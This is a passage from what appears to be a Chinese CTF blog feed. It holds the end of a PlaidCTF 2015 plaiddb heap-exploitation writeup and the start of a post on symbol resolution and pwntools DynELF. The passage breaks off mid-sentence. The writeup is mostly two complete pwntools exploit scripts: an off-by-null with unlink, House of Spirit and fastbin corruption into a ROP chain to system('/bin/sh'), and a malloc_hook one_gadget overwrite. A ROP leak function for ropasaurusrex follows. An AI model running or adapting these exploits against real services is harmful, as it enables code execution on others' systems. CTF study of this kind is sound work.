  | [freed]                                         |     ::     | +------------+ 0x2e0 - 0x10                                    +---- :: ----+ |    0x40    | node &#39;2&#39; =&gt; [freed]                             |     ::     | +------------+ 0x320 - 0x10                                    +---- :: ----+ |    0x20    | &#39;2&#39; =&gt; [freed]                                  |     ::     | +------------+ 0x340 - 0x10                                    +---- :: ----+ |    0x20    | [freed]                                         |     ::     | +------------+ 0x360 - 0x10                                    +---- :: ----+ |    0x40    | [freed]                                         |     ::     | +------------+ 0x3a0 - 0x10                                    +---- :: ----+ |    0x20    | [freed]                                         |     ::     | +------------+ 0x3c0 - 0x10                       0x3c0 - 0x10 +---- :: ----+ |   0x100    | &#39;X&#39; * 0xf8                           &#39;X&#39; * 0xf8 |     ::     | +------------+ 0x4c0 - 0x10                                    +---- :: ----+ |   0x120    | &#39;B&#39; * 0xf8 + p64(0x21) + &#39;C&#39; * 0x18 =&gt; [freed]  |     ::     | +------------+                                    0x5c0 - 0x10 +------------+                                                     &#39;C&#39; * 0x18 |    0x20    |                                                                +------------+</code></pre><p>利用 PUT 泄漏出 heap，并且能构造一个泄漏函数：</p><pre><code class="python"># Leak Heap AddressDEL(&#39;3&#39;) # put a previous node chunk into fastbinPUT(&#39;KEY1&#39;, (&#39;A&#39; * 0x108 +    p64(0x40) + p64(0) + &#39;D&#39; * 0x30 +    p64(0x21) + p64(0) + &#39;C&#39; * 0x10 +    p64(0x21) + &#39;KEY1\x00&#39;).ljust(1000, &#39;Q&#39;))PUT(&#39;LEAKBUF&#39;, &#39;&#39;)data = GET(&#39;KEY1&#39;)heap_base = u64(data[0x110:0x118]) - 0x150info(&#39;heap_base = &#39; + hex(heap_base))# Function for Leaking Memorydef leak(addr, size):    PUT(&#39;KEY1&#39;, &#39;A&#39; * 0x3e8)    PUT(&#39;KEY1&#39;, data[:0x118] + p64(size) + p64(addr) + data[0x128:])    return GET(&#39;LEAKBUF&#39;)</code></pre><p>LEAKBUF 在内存中的布局如下，LEAKBUF 的结构体中的 data 和 data_size 可以被 overlap，再用 PUT 泄漏：</p><pre><code> +------------+ 0x0f0 - 0x10 |    0x40    | node &#39;3&#39; =&gt; [freed] =&gt; node &#39;KEY1&#39; +------------+ 0x130 - 0x10 |    0x20    | &#39;3&#39; =&gt; [freed] =&gt; &#39;&#39; +------------+ 0x150 - 0x10 |    0x20    | &#39;&#39; =&gt; [freed] =&gt; &#39;LEAKBUF&#39; +------------+ 0x170 - 0x10 |    0x40    | [freed] +------------+ 0x1b0 - 0x10 |    0x20    | [freed] +------------+ 0x1d0 - 0x10 |   0x3f0    | [freed] =&gt; chunk +---- :: ----+ 0x260 - 0x10 |     ::     | [freed] +---- :: ----+ 0x2a0 - 0x10 |     ::     | [freed] +---- :: ----+ 0x2c0 - 0x10 |     ::     | [freed] +---- :: ----+ 0x2e0 - 0x10 |   [0x40]   | [freed] =&gt; node &#39;LEAKBUF&#39; +---- :: ----+ 0x320 - 0x10 |   [0x20]   | [freed] +---- :: ----+ 0x340 - 0x10 |   [0x20]   | [freed] =&gt; &#39;KEY1&#39; +---- :: ----+ 0x360 - 0x10 |     ::     | [freed] +---- :: ----+ 0x3a0 - 0x10 |     ::     | [freed] +---- :: ----+ 0x3c0 - 0x10 |     ::     | &#39;X&#39; * 0xf8 +---- :: ----+ 0x4c0 - 0x10 |     ::     | [freed] +------------+ 0x5c0 - 0x10 |    0x20    | &#39;C&#39; * 0x18 +------------+</code></pre><p>接下来构造一个假的 fastbin chunk 来进行 House-of-Spirit，然后改掉它的 fd 指针：</p><pre><code class="python"># House of Spirit + Fastbin Corruption + ROPPUT(&#39;KEY1&#39;, &#39;A&#39; * 0x3e8)PUT(&#39;KEY1&#39;, (&#39;A&#39; * 0x108 +    p64(0x40) + p64(heap_base + 0x3e0) + # point LEAKBUF&#39;s key to &#39;P\x00&#39;    p64(0x64) + p64(0) + p64(0) + p64(0) + p64(0) +    p64(0x40) + p64(0x40) + &#39;KEY1\x00&#39;.ljust(0x38, &#39;A&#39;) + # 0x358    p64(0x40) + &#39;A&#39; * 0x78 + # 0x3d8    p64(0x40) + &#39;P\x00&#39;.ljust(0x38, &#39;A&#39;) + p64(0x41)).ljust(0x3e8, &#39;Q&#39;))DEL(&#39;P&#39;) # house of spiritDEL(&#39;KEY1&#39;)PUT(&#39;KEY1&#39;, (&#39;A&#39; * 0x108 +    p64(0x40) + p64(heap_base + 0x3e0) +    p64(0x64) + p64(0) + p64(0) + p64(0) + p64(0) +    p64(0x40) + p64(0x40) + p64(fake_chunk_addr) + &#39;A&#39; * 0x30 +    p64(0x40) + &#39;A&#39; * 0x78 + # 0x3d8    p64(0x40) + &#39;A&#39; * 0x40 + # 0x420    p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(system_addr)).ljust(0x3e8, &#39;Q&#39;) # place gadgets) # fastbin corruption</code></pre><p>最后这里堆布局比较复杂，大概就是伪造一个 fastbin 然后再改它的指针，后面就能取到指针对应的 fake chunk：</p><pre><code> +------------+ 0x0f0 - 0x10 |    0x40    | node &#39;KEY1&#39; +------------+ 0x130 - 0x10 |    0x20    | &#39;&#39; +------------+ 0x150 - 0x10 |    0x20    | &#39;LEAKBUF&#39; +------------+ 0x170 - 0x10 |    0x40    | [freed] +------------+ 0x1b0 - 0x10 |    0x20    | [freed] +------------+ 0x1d0 - 0x10 |   0x3f0    | chunk +---- :: ----+ 0x260 - 0x10 |     ::     | [freed] +---- :: ----+ 0x2a0 - 0x10 |     ::     | [freed] +---- :: ----+ 0x2c0 - 0x10 |     ::     | [freed] +---- :: ----+ 0x2e0 - 0x10 |   [0x40]   | node &#39;LEAKBUF&#39; +---- :: ----+ 0x320 - 0x10 |   [0x20]   | [freed] +---- :: ----+ 0x340 - 0x10 |   [0x20]   | &#39;KEY1&#39; =&gt; fake_chunk_addr +---- :: ----+ 0x360 - 0x10 |     ::     | [freed] +---- :: ----+ 0x3a0 - 0x10 |     ::     | [freed] +---- :: ----+ 0x3c0 - 0x10 |   [0x40]   | &#39;X&#39; * 0xf8 =&gt; &#39;P\x00&#39; =&gt; &#39;A&#39; * 0x40 + gadgets +---- :: ----+ 0x4c0 - 0x10 |     ::     | [freed] +------------+ 0x5c0 - 0x10 |    0x20    | &#39;C&#39; * 0x18 +------------+</code></pre><p>最后用 PUT 里的任意大小 malloc 取一个大小为 56 的 chunk。前面构造的 fd 指针位置指向读进去的 data_size 存储的位置，因为程序用的是 strtoul，所以送出去的字符串都会被存在栈上，就能构造一个大小合适的 chunk。为了绕过对 main_arena 的检查，把 fake chunk 的 IS_MMAP 标志位开启：</p><pre><code class="python">cmd(&#39;PUT&#39;)p.recvuntil(&#39;Enter row key:&#39;)p.sendline(&#39;KEY1&#39;)p.recvuntil(&#39;Enter data size:&#39;)p.send(&#39;56&#39;.ljust(8, &#39; &#39;) + p64(0x42))p.recvuntil(&#39;PROMPT: Enter data:&#39;)p.send((&#39;A&#39; * 7 + p64(canary) + &#39;A&#39; * 0x10 + p64(fake_rbp) + p64(leave_ret)).ljust(55, &#39;A&#39;))</code></pre><p>最后送 data 的时候不是补成 55 是因为前面用 fgets 读 data_size 的时候最后面多补了个 <code>&quot;\x00&quot;</code>：</p><pre><code>0x7fff7e985540: 0x2020202020203635      0x00000000000000420x7fff7e985550: 0x4141414141414100      0xa5f15260d10909000x7fff7e985560: 0x4141414141414141      0x41414141414141410x7fff7e985570: 0x00005560f2703418      0x00007ff1b1cc9a9e0x7fff7e985580: 0x4141414141414141      0xa5f15260d1090900</code></pre><p>在 CTF-Wiki 上还有另外一种更简洁的做法，先造一堆 fastbin，接着构造 chunk。最后用 fastbin attack 改 malloc_hook：</p><pre><code>datastore-&gt;malloc(56)             = 0x55ac13f22010datastore-&gt;malloc(8)              = 0x55ac13f22050datastore-&gt;malloc(9)              = 0x55ac13f22070datastore-&gt;malloc(56)             = 0x55ac13f22090 =&gt; &#39;X&#39; * 0x200datastore-&gt;malloc(8)              = 0x55ac13f220d0datastore-&gt;malloc(56)             = 0x55ac13f220f0datastore-&gt;malloc(56)             = 0x55ac13f22130datastore-&gt;malloc(8)              = 0x55ac13f22170datastore-&gt;malloc(56)             = 0x55ac13f22190datastore-&gt;malloc(56)             = 0x55ac13f221d0datastore-&gt;malloc(8)              = 0x55ac13f22210datastore-&gt;malloc(56)             = 0x55ac13f22230datastore-&gt;malloc(56)             = 0x55ac13f22270datastore-&gt;malloc(8)              = 0x55ac13f222b0datastore-&gt;malloc(56)             = 0x55ac13f222d0datastore-&gt;malloc(56)             = 0x55ac13f22310datastore-&gt;malloc(8)              = 0x55ac13f22350datastore-&gt;malloc(56)             = 0x55ac13f22370datastore-&gt;malloc(56)             = 0x55ac13f223b0datastore-&gt;malloc(8)              = 0x55ac13f223f0 =&gt; &#39;6&#39;datastore-&gt;malloc(56)             = 0x55ac13f22410datastore-&gt;malloc(56)             = 0x55ac13f22450datastore-&gt;malloc(8)              = 0x55ac13f22490 =&gt; &#39;4&#39; =&gt; [freed] =&gt; &#39;fillup2&#39;datastore-&gt;malloc(56)             = 0x55ac13f224b0 =&gt; [freed] =&gt; node &#39;fillup2&#39;datastore-&gt;malloc(56)             = 0x55ac13f224f0 =&gt; node &#39;4&#39; =&gt; [freed] =&gt; node &#39;fillup1&#39;datastore-&gt;malloc(8)              = 0x55ac13f22530 =&gt; &#39;3&#39; =&gt; [freed]datastore-&gt;malloc(56)             = 0x55ac13f22550 =&gt; node &#39;6&#39;datastore-&gt;malloc(56)             = 0x55ac13f22590 =&gt; node &#39;5&#39; =&gt; [freed]datastore-&gt;malloc(8)              = 0x55ac13f225d0 =&gt; &#39;5&#39; =&gt; [freed]datastore-&gt;malloc(56)             = 0x55ac13f225f0 =&gt; node &#39;3&#39; =&gt; [freed]datastore-&gt;malloc(56)             = 0x55ac13f22630 =&gt; node &#39;1&#39; =&gt; [freed]datastore-&gt;malloc(8)              = 0x55ac13f22670 =&gt; &#39;2&#39;datastore-&gt;malloc(56)             = 0x55ac13f22690 =&gt; node &#39;2&#39;datastore-&gt;malloc(8)              = 0x55ac13f226d0 =&gt; &#39;1&#39; =&gt; [freed] =&gt; &#39;fillup1&#39;datastore-&gt;malloc(512)            = 0x55ac13f226f0 =&gt; &#39;1&#39; * 0x200 =&gt; [freed] &lt;= unlink pointer =&gt; &#39;X&#39; * 0x200datastore-&gt;malloc(80)             = 0x55ac13f22900 =&gt; &#39;2&#39; * 0x50datastore-&gt;malloc(104)            = 0x55ac13f22960 =&gt; &#39;5&#39; * 0x68 =&gt; [freed] &lt;= overlap fddatastore-&gt;malloc(504)            = 0x55ac13f229d0 =&gt; &#39;3&#39; * 0x1f8 =&gt; [freed] =&gt; &#39;A&#39; * 0x1f0 + p64(0xdb0 - 0x6f0)datastore-&gt;malloc(240)            = 0x55ac13f22bd0 =&gt; &#39;4&#39; * 0xf0 =&gt; [freed]datastore-&gt;malloc(1024)           = 0x55ac13f22cd0 =&gt; &#39;6&#39; * 0x400</code></pre><h1 id="Exploit-Script"><a href="#Exploit-Script" class="headerlink" title="Exploit Script"></a>Exploit Script</h1><p>第一种方法的 Exploit 主要是跟着 Winesap 做的：</p><pre><code class="python">#!/usr/bin/env pythonfrom pwn import *context.arch = &#39;amd64&#39;context.log_level = &#39;debug&#39;local = 0if local:    p = process(&#39;./datastore&#39;)    libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)else:    p = remote(&#39;127.0.0.1&#39;, 4000)    libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)def cmd(c):    p.recvuntil(&#39;Enter command:&#39;)    p.sendline(c)def PUT(key, data):    cmd(&#39;PUT&#39;)    p.recvuntil(&#39;Enter row key:&#39;)    p.sendline(key)    p.recvuntil(&#39;Enter data size:&#39;)    p.sendline(str(len(data)))    p.recvuntil(&#39;PROMPT: Enter data:&#39;)    p.send(data)def DEL(key):    cmd(&#39;DEL&#39;)    p.recvuntil(&#39;Enter row key:&#39;)    p.sendline(key)def GET(key):    cmd(&#39;GET&#39;)    p.recvuntil(&#39;Enter row key:&#39;)    p.sendline(key)    p.recvuntil(&#39; bytes]:\n&#39;)    return p.recvuntil(&#39;PROMPT: &#39;)[:-8]PUT(&#39;MMAP&#39;, &#39;Z&#39; * 0x21000)# Off by Null + UnlinkPUT(&#39;3&#39;, &#39;&#39;)PUT(&#39;0&#39;, &#39;C&#39; * 0x80) # smallbin for unlinkPUT(&#39;1&#39;, &#39;&#39;) # chunk for overflowPUT(&#39;2&#39;, &#39;&#39;)PUT(&#39;1&#39;, &#39;A&#39; * 0xf8)PUT(&#39;2&#39;, &#39;B&#39; * 0xf8 + p64(0x21) + &#39;C&#39; * 0x18) # chunk for off-by-null ; fake a fastbinDEL(&#39;1&#39;)DEL(&#39;X&#39; * 240 + p64(0x4c0 - 0x1d0)) # off-by-null(shrink) ; set prev_sizeDEL(&#39;0&#39;)DEL(&#39;2&#39;) # unlink#raw_input(&#39;@&#39;)# Leak Heap AddressDEL(&#39;3&#39;) # put a previous node chunk into fastbinPUT(&#39;KEY1&#39;, (&#39;A&#39; * 0x108 +    p64(0x40) + p64(0) + &#39;D&#39; * 0x30 +    p64(0x21) + p64(0) + &#39;C&#39; * 0x10 +    p64(0x21) + &#39;KEY1\x00&#39;).ljust(1000, &#39;Q&#39;))PUT(&#39;LEAKBUF&#39;, &#39;&#39;)data = GET(&#39;KEY1&#39;)heap_base = u64(data[0x110:0x118]) - 0x150info(&#39;heap_base = &#39; + hex(heap_base))#raw_input(&#39;@&#39;)# Function for Leaking Memorydef leak(addr, size):    PUT(&#39;KEY1&#39;, &#39;A&#39; * 0x3e8)    PUT(&#39;KEY1&#39;, data[:0x118] + p64(size) + p64(addr) + data[0x128:])    return GET(&#39;LEAKBUF&#39;)mmap_chunk = u64(leak(heap_base + 0xa0, 8)) - 0x10info(&#39;mmap_chunk = &#39; + hex(mmap_chunk))libc_base = u64(leak(mmap_chunk + 0x22000 + 0x750, 8)) - 0x5dc740info(&#39;libc_base = &#39; + hex(libc_base))canary = u64(leak(mmap_chunk + 0x22000 + 0x768, 8))info(&#39;canary = &#39; + hex(canary))stack_addr = u64(leak(mmap_chunk + 0x22000 + 0xa40, 8))info(&#39;stack_addr = &#39; + hex(stack_addr))#raw_input(&#39;@&#39;)# find Gadgets &amp; Bufferpop_rdi_ret = libc_base + libc.search(asm(&#39;pop rdi ; ret&#39;)).next()leave_ret = libc_base + libc.search(asm(&#39;leave ; ret&#39;)).next()system_addr = libc_base + libc.symbols[&#39;system&#39;]bin_sh_addr = libc_base + libc.search(&#39;/bin/sh&#39;).next()info(&#39;pop_rdi_ret = &#39; + hex(pop_rdi_ret))info(&#39;leave_ret = &#39; + hex(leave_ret))info(&#39;system_addr = &#39; + hex(system_addr))info(&#39;bin_sh_addr = &#39; + hex(bin_sh_addr))fake_chunk_addr = stack_addr - 0x90fake_rbp = heap_base + 0x420 - 8#raw_input(&#39;@&#39;)# House of Spirit + Fastbin Corruption + ROPPUT(&#39;KEY1&#39;, &#39;A&#39; * 0x3e8)PUT(&#39;KEY1&#39;, (&#39;A&#39; * 0x108 +    p64(0x40) + p64(heap_base + 0x3e0) + # point LEAKBUF&#39;s key to &#39;P\x00&#39;    p64(0x64) + p64(0) + p64(0) + p64(0) + p64(0) +    p64(0x40) + p64(0x40) + &#39;KEY1\x00&#39;.ljust(0x38, &#39;A&#39;) + # 0x358    p64(0x40) + &#39;A&#39; * 0x78 + # 0x3d8    p64(0x40) + &#39;P\x00&#39;.ljust(0x38, &#39;A&#39;) + p64(0x41)).ljust(0x3e8, &#39;Q&#39;))DEL(&#39;P&#39;) # house of spiritDEL(&#39;KEY1&#39;)#raw_input(&#39;@&#39;)PUT(&#39;KEY1&#39;, (&#39;A&#39; * 0x108 +    p64(0x40) + p64(heap_base + 0x3e0) +    p64(0x64) + p64(0) + p64(0) + p64(0) + p64(0) +    p64(0x40) + p64(0x40) + p64(fake_chunk_addr) + &#39;A&#39; * 0x30 +    p64(0x40) + &#39;A&#39; * 0x78 + # 0x3d8    p64(0x40) + &#39;A&#39; * 0x40 + # 0x420    p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(system_addr)).ljust(0x3e8, &#39;Q&#39;) # place gadgets) # fastbin corruption#raw_input(&#39;@&#39;)cmd(&#39;PUT&#39;)p.recvuntil(&#39;Enter row key:&#39;)p.sendline(&#39;KEY1&#39;)p.recvuntil(&#39;Enter data size:&#39;)p.send(&#39;56&#39;.ljust(8, &#39; &#39;) + p64(0x42))p.recvuntil(&#39;PROMPT: Enter data:&#39;)#raw_input(&#39;@&#39;)p.send((&#39;A&#39; * 7 + p64(canary) + &#39;A&#39; * 0x10 + p64(fake_rbp) + p64(leave_ret)).ljust(55, &#39;A&#39;))p.recvuntil(&#39;INFO: Update successful.\n&#39;)p.interactive()</code></pre><p>另一种做法：</p><pre><code class="python">#!/usr/bin/env pythonfrom pwn import *context.arch = &#39;amd64&#39;context.log_level = &#39;debug&#39;local = 1if local:    p = process(&#39;./datastore&#39;)    libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)else:    p = remote(&#39;127.0.0.1&#39;, 4000)    libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)def cmd(c):    p.recvuntil(&#39;Enter command:&#39;)    p.sendline(c)def PUT(key, data):    cmd(&#39;PUT&#39;)    p.recvuntil(&#39;Enter row key:&#39;)    p.sendline(key)    p.recvuntil(&#39;Enter data size:&#39;)    p.sendline(str(len(data)))    p.recvuntil(&#39;PROMPT: Enter data:&#39;)    p.send(data)def DEL(key):    cmd(&#39;DEL&#39;)    p.recvuntil(&#39;Enter row key:&#39;)    p.sendline(key)def GET(key):    cmd(&#39;GET&#39;)    p.recvuntil(&#39;Enter row key:&#39;)    p.sendline(key)    p.recvuntil(&#39; bytes]:\n&#39;)    return p.recvuntil(&#39;PROMPT: &#39;)[:-8]for i in range(10):    PUT(str(i), str(i) * 0x38)for i in range(10):    DEL(str(i))PUT(&#39;1&#39;, &#39;1&#39; * 0x200)PUT(&#39;2&#39;, &#39;2&#39; * 0x50)PUT(&#39;5&#39;, &#39;5&#39; * 0x68)PUT(&#39;3&#39;, &#39;3&#39; * 0x1f8)PUT(&#39;4&#39;, &#39;4&#39; * 0xf0)PUT(&#39;6&#39;, &#39;6&#39; * 0x400)DEL(&#39;5&#39;)DEL(&#39;3&#39;)DEL(&#39;1&#39;)DEL(&#39;A&#39; * 0x1f0 + p64(0xbd0 - 0x6f0)) # off-by-null + shrinkDEL(&#39;4&#39;) # unlinkPUT(&#39;fillup1&#39;, &#39;X&#39; * 0x200)PUT(&#39;fillup2&#39;, &#39;X&#39; * 0x200)data = GET(&#39;2&#39;)libc_base = u64(data[:8]) - 0x3c27b8info(&#39;libc_base = &#39; + hex(libc_base))#raw_input(&#39;@&#39;)free_hook = libc_base + libc.symbols[&#39;__free_hook&#39;]malloc_hook = libc_base + libc.symbols[&#39;__malloc_hook&#39;]system = libc_base + libc.symbols[&#39;system&#39;]one_gadgets = [0x46428, 0x4647c, 0xe9415, 0xea36d]one_gadget = libc_base + one_gadgets[1]info(&#39;one_gadget = &#39; + hex(one_gadget))PUT(&#39;fastatk&#39;, (&#39;A&#39; * 0x58 + p64(0x71) + p64(malloc_hook - 0x23)).ljust(0x100, &#39;\x00&#39;))PUT(&#39;X&#39;, &#39;X&#39; * 0x68)#raw_input(&#39;@&#39;)PUT(&#39;atk&#39;, (&#39;A&#39; * 0x13 + p64(one_gadget)).ljust(0x68, &#39;\x00&#39;))DEL(&#39;2&#39;)p.interactive()</code></pre><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/off_by_one-zh/#2-plaidctf-2015-plaiddb" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/off_by_one-zh/#2-plaidctf-2015-plaiddb</a><br><a href="https://www.youtube.com/watch?v=jEHgm7S58N8" target="_blank" rel="noopener">https://www.youtube.com/watch?v=jEHgm7S58N8</a><br><a href="http://winesap.logdown.com/posts/261369-plaid-ctf-2015-plaiddb-writeup" target="_blank" rel="noopener">http://winesap.logdown.com/posts/261369-plaid-ctf-2015-plaiddb-writeup</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;之前本来想写篇 Off-by-One 相关的，后来感觉理解了思想以后也不需要额外去多折腾什么了。这里记录一道比较复杂的题目。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="ctf" scheme="blog.b3ale.cn/tags/ctf/"/>
    
      <category term="pwn" scheme="blog.b3ale.cn/tags/pwn/"/>
    
      <category term="wp" scheme="blog.b3ale.cn/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>A Trip of Symbol Resolution</title>
    <link href="blog.b3ale.cn/2020/04/06/A-Trip-of-Symbol-Resolution/"/>
    <id>blog.b3ale.cn/2020/04/06/A-Trip-of-Symbol-Resolution/</id>
    <published>2020-04-06T08:04:26.000Z</published>
    <updated>2020-04-21T13:13:04.481Z</updated>
    
    <content type="html"><![CDATA[<p>重看 Winesap 的视频收获颇多，重新把 return-to-dl-resolve 整理了一下。</p><a id="more"></a><h1 id="Prepare"><a href="#Prepare" class="headerlink" title="Prepare"></a>Prepare</h1><p>需要编译一个带调试信息的 libc，之前的博客里记录过。要在 gdb 里跟进带调试信息 ld.so 的 Makefile 如下：</p><pre><code>all: aa: a.c        gcc a.c -o a -Wl,-dynamic-linker /path/to/install/lib/ld-2.23.so -g</code></pre><p>使用 apt 安装的 gdb 在 <code>_dl_fixup()</code> 中不能单步跟，会直接略过，通过修改源码添加一个环境变量来更改 gdb 的跟进。这里以 gdb-7.11.1 为例：</p><pre><code class="cpp">...6501   /* If we are stepping at the source level and entered the runtime6502      loader dynamic symbol resolution code...65036504      EXEC_FORWARD: we keep on single stepping until we exit the run6505      time loader code and reach the callee&#39;s address.65066507      EXEC_REVERSE: we&#39;ve already executed the callee (backward), and6508      the runtime loader code is handled just like any other6509      undebuggable function call.  Now we need only keep stepping6510      backward through the trampoline code, and that&#39;s handled further6511      down, so there is nothing for us to do here.  */65126513   static int env_debug_resolver = -1;6514   if (env_debug_resolver == -1) {6515     char *env_debug_resolver_str = getenv(&quot;DEBUG_RESOLVER&quot;);6516     if (env_debug_resolver_str &amp;&amp; !strcmp(env_debug_resolver_str, &quot;1&quot;)) {6517       env_debug_resolver = 1;6518     } else {6519       env_debug_resolver = 0;6520     }6521   }6522   if (execution_direction != EXEC_REVERSE6523       &amp;&amp; ecs-&gt;event_thread-&gt;control.step_over_calls == STEP_OVER_UNDEBUGGABLE6524       &amp;&amp; env_debug_resolver == 06525       &amp;&amp; in_solib_dynsym_resolve_code (stop_pc))6526     {6527       CORE_ADDR pc_after_resolver =6528         gdbarch_skip_solib_resolver (gdbarch, stop_pc);...</code></pre><p>生成 Makefile 时必须添加 <code>--enable-tui</code> 才会有 layout 的界面（编译的时候使用系统默认 python 版本，如果需要 pwndbg、gef 之类的插件就必须用 python3）：</p><pre><code class="bash">../configure --enable-tui --with-python=/usr/bin/python2.7</code></pre><p>如果在最后安装 gdb 的时候出现 <code>makeinfo: not found</code>，只需要装个 <code>texinfo</code> 即可：</p><pre><code class="bash">/home/b3ale/gdb-7.11.1/missing: 81: /home/b3ale/gdb-7.11.1/missing: makeinfo: not foundWARNING: &#39;makeinfo&#39; is missing on your system.         You should only need it if you modified a &#39;.texi&#39; file, or         any other file indirectly affecting the aspect of the manual.         You might want to install the Texinfo package:         &lt;http://www.gnu.org/software/texinfo/&gt;         The spurious makeinfo call might also be the consequence of         using a buggy &#39;make&#39; (AIX, DU, IRIX), in which case you might         want to install GNU make:         &lt;http://www.gnu.org/software/make/&gt;Makefile:503: recipe for target &#39;gdb.info&#39; failedmake[5]: *** [gdb.info] Error 127make[5]: Leaving directory &#39;/home/b3ale/gdb-7.11.1/build/gdb/doc&#39;Makefile:1505: recipe for target &#39;subdir_do&#39; failedmake[4]: *** [subdir_do] Error 1make[4]: Leaving directory &#39;/home/b3ale/gdb-7.11.1/build/gdb&#39;Makefile:1240: recipe for target &#39;install-only&#39; failedmake[3]: *** [install-only] Error 2make[3]: Leaving directory &#39;/home/b3ale/gdb-7.11.1/build/gdb&#39;Makefile:1237: recipe for target &#39;install&#39; failedmake[2]: *** [install] Error 2make[2]: Leaving directory &#39;/home/b3ale/gdb-7.11.1/build/gdb&#39;Makefile:9185: recipe for target &#39;install-gdb&#39; failedmake[1]: *** [install-gdb] Error 2make[1]: Leaving directory &#39;/home/b3ale/gdb-7.11.1/build&#39;Makefile:2248: recipe for target &#39;install&#39; failedmake: *** [install] Error 2</code></pre><p>在需要调试 <code>_dl_fixup()</code> 时只需要 export 一个环境变量即可：</p><pre><code class="bash">export DEBUG_RESOLVER=1</code></pre><p>对于没有链接带符号 ld 的程序，可以在本地做一个软链接，然后把程序中 ld 对应的字符串替换掉（以 32 位为例）：</p><pre><code class="bash">sed -i s/ld-linux.so.2/LD-linux.so.2/g ./binary</code></pre><h1 id="How-DynELF-Works"><a href="#How-DynELF-Works" class="headerlink" title="How DynELF Works?"></a>How DynELF Works?</h1><p>在 pwntools 中有一个工具叫 DynELF，可以通过一个任意内存读的漏洞来对获取 libc 以及解析出 libc 中任何函数的地址。它的原理跟 ELF 的相关结构有关，下面先来看看怎么使用 DynELF。</p><h2 id="PlaidCTF-2013-ropasaurusrex"><a href="#PlaidCTF-2013-ropasaurusrex" class="headerlink" title="PlaidCTF-2013-ropasaurusrex"></a>PlaidCTF-2013-ropasaurusrex</h2><p>以 PlaidCTF 2013 中的 ropasaurusrex 为例。程序很简单，明显有溢出：</p><pre><code class="cpp">ssize_t __cdecl main(){  vul();  return write(1, &quot;WIN\n&quot;, 4u);}ssize_t vul(){  char buf; // [esp+10h] [ebp-88h]  return read(0, &amp;buf, 0x100u);}</code></pre><p>通过溢出可以修改返回地址为 <code>start</code>，来构造无限次输入；同时可以跳 <code>write</code> 来泄漏信息。能构造出如下的 leak 函数，每次可以泄漏指定地址上的 4 个字节的数据：</p><pre><code class="python">elf = ELF(&#39;./ropasaurusrex&#39;)write_plt = elf.plt[&#39;write&#39;]start_addr = 0x8048340def leak(addr):    payload = flat(        &#39;A&#39; * 140,        write_plt,        start_addr,        1,        addr,        4    )    p.sendline(payload)    data = p.recv(4)    info(hex(addr) + &#39; ==&gt; &#39; + data)    return data</code></pre><p>使用 DynELF 指定开始泄漏的地址，可以把 libc 的基址泄漏出来：</p><pre><code class="python">#  0x8048000  0x8049000 r-xp     1000 0      /root/tmp/ropasaurusrexprog = DynELF(leak, 0x8048000)bases = prog.bases()info(bases)for l in bases:    if &#39;libc.so.6&#39; in l:        ptr = bases[l]info(&#39;ptr =&gt; &#39; + hex(ptr))</code></pre><p>然后从 libc 基址开始使用 DynELF 找到 <code>system</code> 和 <code>read</code> 的地址：</p><pre><code class="python">libc = DynELF(leak, ptr)system_addr = libc.lookup(&#39;system&#39;)read_addr = libc.lookup(&#39;read&#39;)</code></pre><h2 id="Lazy-Symbol-Binding"><a href="#Lazy-Symbol-Binding" class="headerlink" title="Lazy Symbol Binding"></a>Lazy Symbol Binding</h2><p>接下来慢慢解释 DynELF 是怎么实现的。先要了解延迟绑定这一概念。在程序执行的过程中，可能有些引入的 C 库函数到结束时都不会执行。所以 ELF 采用延迟绑定的技术，在第一次调用 C 库函数时才会去寻找真正的位置进行绑定：</p><ul><li>程序启动时，外部函数的地址未知（比如说在 libc 中的函数）</li><li>只有动态链接的程序需要解析函数地址，静态链接的程序不需要</li><li>函数第一次被调用时，通过 Dynamic Resolver 来计算函数的地址，并在 GOT 上做好重定位</li></ul><h2 id="ELF-Structure"><a href="#ELF-Structure" class="headerlink" title="ELF Structure"></a>ELF Structure</h2><p>接下来了解一下 ELF 文件的结构。结构体在 <a href="https://code.woboq.org/userspace/glibc/elf/elf.h.html" target="_blank" rel="noopener"><code>glibc/elf/elf.h</code></a> 中。</p><p>笼统地来说，ELF 包括 ELF Header、Program Header Table、Section（Segment）、Section Header Table 几个部分。在程序执行前和执行时，ELF 的结构是不同的。在程序执行前，ELF Header 中存储了 Section Header Table 的位置，而 Section Header Table 中又存储了每个 Section 的位置；在程序执行时，一个或多个 Section 会被映射到一个 Segment 中，ELF Header 中存储了 Program Header Table 的位置，而 Program Header Table 中存储了各个 Segment 的地址：</p><pre><code>             Linking View                        Execution View       +----------------------+             +----------------------+       |      ELF Header      |  ---+ +---  |      ELF Header      |       |----------------------|     | |     |----------------------|       | Program Header Table |     | +---&gt; | Program Header Table |  ---+       |      (optional)      |     |       |----------------------|     |       |----------------------|     |       |                      |     | +---&gt; |      Section 1       | ----|-----&gt; |      Segment 1       | &lt;---| |     |----------------------|     | |     |                      |     | |     |         ...          | ----|-+     |----------------------|     | |     |----------------------|     |       |                      |     | |---&gt; |      Section n       | ----|-----&gt; |      Segment 2       | &lt;---+ |     |----------------------|     | |     |                      | |     |         ...          | ----|-+     |----------------------| |     |----------------------|     |       | Section Header Table | +---  | Section Header Table | &lt;---+       |      (optional)      |       +----------------------+             +----------------------+</code></pre><p>几个部分大概的描述如下：</p><ul><li>Section（节区）：存放代码和数据的一块连续内存（例：.text、.data、.bss、.got）<ul><li><code>objdump -j .got.plt -s ./</code></li></ul></li><li>Segment（段）：包含多个 Section 的连续内存</li><li>Program Header Table 描述 Section 和 Segment 的对应关系，不一定所有的 Section 都会有映射，所以 Section 中的数据不一定全部出现在内存中</li></ul><p>ELF Header 中，<code>e_ident</code> 存储了 Magic Number 即 <code>&quot;\x7fELF&quot;</code>，<code>e_machine</code> 即程序对应的架构，<code>e_entry</code> 存储了程序的入口点，<code>e_phoff</code> 和 